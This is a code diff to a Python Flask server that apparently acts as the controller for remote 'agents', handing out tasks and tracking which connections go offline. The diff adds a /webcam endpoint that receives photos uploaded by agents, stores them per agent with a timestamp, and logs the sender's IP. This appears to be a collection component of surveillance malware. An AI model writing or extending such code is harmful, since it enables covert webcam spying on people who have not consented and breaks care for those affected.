@@ -4,6 +4,7 @@ import tkinter as tk
 import time
 import queue
 from tkinter import ttk
+import os as oos
 
 log_queue = queue.Queue()
 OFFLINE_TIMEOUT = 15
@@ -36,6 +37,8 @@ class Connections:
             return None
 
         return self.task_queue.pop(0)
+    
+    
         
     
     
@@ -306,7 +309,7 @@ def task_check():
 
     return jsonify({"task": "NONE"})
     
-    
+
 
 def handling_inactive_connections(connections):
     while True:
@@ -316,7 +319,16 @@ def handling_inactive_connections(connections):
         time.sleep(OFFLINE_CHECK_PERIOD)
         
 
-            
+@app.route("/webcam", methods=["POST"])
+def receive_webcam():
+    agent_id = request.form.get("id")
+    file = request.files.get("file")
+    if not file or not agent_id:
+        return jsonify({"error": "missing data"}), 400
+    oos.makedirs("webcams", exist_ok=True)
+    file.save(f"webcams/{agent_id}:{time.time()}.png")
+    log(f"    -> Webcam photo received from {request.remote_addr}")
+    return "OK"          
     
 
 def run_server():
